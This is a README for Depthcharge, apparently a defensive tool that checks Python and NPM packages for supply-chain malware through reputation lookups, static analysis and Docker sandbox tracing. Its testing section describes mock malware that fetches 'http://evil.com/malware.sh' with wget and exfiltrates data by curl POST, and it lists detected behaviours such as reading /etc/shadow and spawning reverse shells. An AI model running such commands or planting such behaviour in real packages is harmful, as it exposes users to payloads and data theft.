# Depthcharge 🛡️

**Depthcharge** is a state-of-the-art security analysis tool designed to inspect third-party dependencies (Python/PyPI and Node.js/NPM packages) before they are integrated into your production environments. It acts as an advanced firewall against software supply chain attacks by performing comprehensive threat assessments across three independent layers of detection.

---

## 🔍 How It Works

Depthcharge analyzes packages using three modular scanners, producing a unified **Risk Score (0-100)**:

1. **Reputation Engine (Metadata & Intelligence):**
   - Queries public registries (PyPI, NPM) and the Open Source Vulnerabilities (OSV) database.
   - Detects **Typosquatting** (e.g., `reqeusts` vs `requests`).
   - Flags suspiciously new packages, hidden authors, or low-release counts.
   - Checks for known CVEs/GHSAs.

2. **Static Code Analyzer (AST & YARA Rules):**
   - Downloads the package archive and parses the raw source code.
   - Detects dangerous AST patterns in Python/JS (e.g., `eval()`, `exec()`, base64 decoding chains).
   - Scans for obfuscated code and unusually high-entropy strings (often hiding malware payloads).
   - Inspects `setup.py` / `package.json` for suspicious pre-install/post-install hooks.

3. **Dynamic Sandbox (Docker Execution Tracing):**
   - Safely installs and imports the package inside an isolated, network-restricted Docker container.
   - Uses `strace` and system call interception to monitor runtime behavior during installation.
   - Flags malicious events such as unexpected egress network connections, sensitive file leakage (e.g., reading `/etc/shadow`), or suspicious child process spawns (e.g., launching a reverse shell or `wget`).

---

## 🚀 Installation & Setup

### 1. Prerequisites
- **Python**: Version 3.9 or higher.
- **Docker Desktop**: Ensure Docker Desktop is running to enable the Dynamic Sandbox. If Docker is unavailable, the tool will gracefully skip dynamic analysis and rely on reputation and static scanning.

### 2. Setup environment
Clone the project and install requirements:
```bash
# Install the required dependencies
pip install -r requirements.txt
```

---

## 💻 Usage Guide

### 1. Web Dashboard (Recommended)

Depthcharge comes with a stunning web-based dashboard featuring a premium glassmorphic aesthetic, dark mode, and real-time scanning progress updates.

To launch the dashboard server:
```bash
python modules/dashboard/app.py
```
Navigate to **[http://localhost:5001](http://localhost:5001)**.

**Dashboard Features:**
- **Custom Scan Selection:** Toggle individual modules on/off (Reputation, Static, Dynamic).
- **Asynchronous Execution:** Scans run in the background, allowing multiple concurrent analyses without freezing the UI.
- **Final Verdicts:** Clear, color-coded banners indicating if a package is **LEGITIMATE** or **MALWARE DETECTED**.
- **Interactive Reports:** View the sandbox terminal logs, static AST alerts, and a breakdown of exactly why a package received its risk score.

### 2. Command Line Interface (CLI)

Use the CLI `depthcharge.py` for headless scanning or CI/CD integration:

```bash
# Scan a single PyPI package
python depthcharge.py scan requests

# Scan a single NPM package
python depthcharge.py scan express --type npm

# Selectively skip scan modules (e.g., skip reputation and static)
python depthcharge.py scan requests --skip-reputation --skip-static

# Scan a requirements.txt file
python depthcharge.py scan-file requirements.txt

# View past scans database history
python depthcharge.py history
```

---

## 🧪 Testing the Tool

We have provided a suite of test packages inside the `tests/test_packages` directory to prove Depthcharge's detection capabilities.

### 1. Testing Legitimate Packages
A list of highly popular, trusted PyPI packages is located in `legit_packages.txt`. These should score a perfect **0/100 (Low Risk)**.
```bash
python depthcharge.py scan-file tests/test_packages/legit_packages.txt --skip-dynamic
```

### 2. Testing Known Malware & Typosquats
A list of historical PyPI malware and typosquatting attempts is located in `malware_packages.txt`. These should score **>= 70/100 (High Risk/Critical)**.
```bash
python depthcharge.py scan-file tests/test_packages/malware_packages.txt --skip-dynamic
```

### 3. Testing the Dynamic Sandbox (Mock Malware)
We have generated custom mock malware `.tar.gz` archives locally so you can safely observe how Depthcharge's Docker sandbox intercepts malicious runtime behavior (like data exfiltration via `curl` or payload dropping via `wget`) without needing to touch live PyPI servers.

Run the following commands using the `file://` schema:

```bash
# Test 1: Simulates a package spawning a shell to run 'wget http://evil.com/malware.sh'
python depthcharge.py scan "file://$(pwd)/tests/test_packages/dynamic_malware/dist/evil_dynamic-1.0.0.tar.gz"

# Test 2: Simulates a package attempting to exfiltrate data via 'curl POST'
python depthcharge.py scan "file://$(pwd)/tests/test_packages/dynamic_malware/dist/evil_curl_exfil-1.0.0.tar.gz"
```
*Expected Result: Depthcharge will successfully flag these packages with a massive penalty for suspicious runtime behavior, leading to a **High Risk** verdict.*

---

## 🔮 Future Upgrades Possible

Depthcharge is designed to be highly modular. Potential future enhancements include:

1. **Advanced Sandbox Introspection (eBPF):** Upgrading the dynamic sandbox monitor from `strace` to `eBPF` (Extended Berkeley Packet Filter) for kernel-level stealth tracing, preventing advanced malware from detecting the sandbox environment.
2. **AI-Powered Code Analysis:** Integrating an LLM agent into the Static Engine to semantically analyze obfuscated JavaScript/Python payloads and explain the exact intent of the malicious code in the dashboard.
3. **RubyGems & Crates.io Support:** Expanding the ecosystem registries beyond PyPI and NPM to support Ruby and Rust dependency analysis.
4. **Automated Remediation:** Providing automatic pull requests to downgrade or swap out malicious packages in a developer's repository based on CI/CD scan results.
